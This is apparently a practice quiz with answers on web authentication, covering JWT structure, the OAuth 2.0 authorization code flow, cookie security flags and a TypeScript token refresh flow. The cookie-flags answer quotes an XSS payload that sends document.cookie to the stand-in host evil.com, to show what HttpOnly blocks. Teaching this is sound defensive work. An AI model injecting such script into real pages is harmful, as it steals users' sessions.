---
title: Authentication — Practice Quiz
articleSlug: authentication
difficulty: Intermediate
estimatedTime: 20 mins
---

<!-- QUESTION -->
difficulty: Easy
tags: jwt, tokens, stateless

What does JWT stand for, and what are the three parts of a JWT token?

<!-- ANSWER -->
**JWT = JSON Web Token**

A JWT has three base64url-encoded parts separated by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header
.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ  ← Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

**Header** — algorithm and token type:
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload** — claims (data about the user):
```json
{ "sub": "user_123", "name": "Alice", "role": "admin", "iat": 1700000000, "exp": 1700003600 }
```

**Signature** — verifies the token hasn't been tampered with:
```
HMAC-SHA256(base64(header) + "." + base64(payload), SECRET_KEY)
```

**Key point:** JWTs are signed, not encrypted. The payload is readable by anyone — never put sensitive data in it.
<!-- END -->

<!-- QUESTION -->
difficulty: Medium
tags: oauth, flow, authorization

Describe the OAuth 2.0 Authorization Code flow step by step. Why is the authorization code exchanged for tokens on the server, not in the browser?

<!-- ANSWER -->
**OAuth 2.0 Authorization Code Flow:**

```
1. User clicks "Login with Google"
   → Browser redirects to: accounts.google.com/oauth?
       client_id=YOUR_APP&
       redirect_uri=https://yourapp.com/callback&
       scope=openid email&
       response_type=code&
       state=random_csrf_token

2. User authenticates with Google and approves permissions

3. Google redirects back to your callback URL with a code:
   → https://yourapp.com/callback?code=AUTH_CODE&state=random_csrf_token

4. Your SERVER exchanges the code for tokens (server-to-server):
   POST https://oauth2.googleapis.com/token
   { code, client_id, client_secret, redirect_uri, grant_type: "authorization_code" }
   ← { access_token, id_token, refresh_token, expires_in }

5. Server validates tokens, creates session, sets secure cookie
```

**Why exchange on the server, not browser?**
The token exchange requires the `client_secret`. If this happened in the browser (JavaScript), the secret would be exposed to anyone who views source — anyone could impersonate your app. The server never exposes the secret.
<!-- END -->

<!-- QUESTION -->
difficulty: Medium
tags: session, cookies, security

What are `HttpOnly` and `Secure` cookie flags? Why are both critical for session cookies?

<!-- ANSWER -->
**`HttpOnly`:**
The cookie cannot be accessed by JavaScript (`document.cookie`). Only the browser sends it with HTTP requests.

**Why critical:** Prevents XSS (Cross-Site Scripting) attacks from stealing session cookies. Even if an attacker injects `<script>document.location='evil.com?c='+document.cookie</script>`, the HttpOnly session cookie is invisible to JS.

**`Secure`:**
The cookie is only sent over HTTPS connections, never HTTP.

**Why critical:** Prevents session hijacking on unsecured networks. Without it, anyone on the same Wi-Fi can intercept the cookie in plain-text HTTP traffic.

```typescript
res.cookie('session_id', token, {
  httpOnly: true,        // ← JS can't read it
  secure: true,          // ← HTTPS only
  sameSite: 'strict',    // ← CSRF protection (only sent from same origin)
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in ms
});
```

**`SameSite: 'strict'`** is also important — it prevents the browser from sending the cookie on cross-site requests, blocking CSRF attacks.
<!-- END -->

<!-- QUESTION -->
difficulty: Hard
tags: jwt, refresh-tokens, security

Implement a token refresh flow. Why should access tokens have a short expiry (15 minutes)? Where should refresh tokens be stored?

<!-- ANSWER -->
**Why short access token expiry?**
If an access token is stolen, the attacker has access until it expires. 15 minutes limits the damage window. Short tokens can't be revoked (stateless), so expiry is the only guard.

**Token storage:**
- **Access token** → Memory (JS variable) — never localStorage (XSS risk), never a regular cookie (CSRF risk with credentials)
- **Refresh token** → `HttpOnly; Secure; SameSite=strict` cookie — invisible to JS, only sent over HTTPS

**Refresh flow:**
```typescript
// Client: access token expired → refresh silently
async function fetchWithRefresh(url: string) {
  let response = await fetch(url, {
    headers: { Authorization: `Bearer ${accessToken}` }
  });

  if (response.status === 401) {
    // Try to refresh
    const refreshResponse = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include', // sends HttpOnly refresh cookie
    });

    if (!refreshResponse.ok) {
      // Refresh token also expired → log user out
      logout();
      return;
    }

    const { accessToken: newToken } = await refreshResponse.json();
    accessToken = newToken; // store in memory

    // Retry original request with new token
    response = await fetch(url, {
      headers: { Authorization: `Bearer ${newToken}` }
    });
  }

  return response;
}

// Server: POST /auth/refresh
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refresh_token; // HttpOnly cookie
  if (!refreshToken) return res.status(401).end();

  try {
    const payload = jwt.verify(refreshToken, REFRESH_SECRET);
    const newAccessToken = jwt.sign(
      { sub: payload.sub, role: payload.role },
      ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    res.json({ accessToken: newAccessToken });
  } catch {
    res.status(401).end();
  }
});
```
<!-- END -->
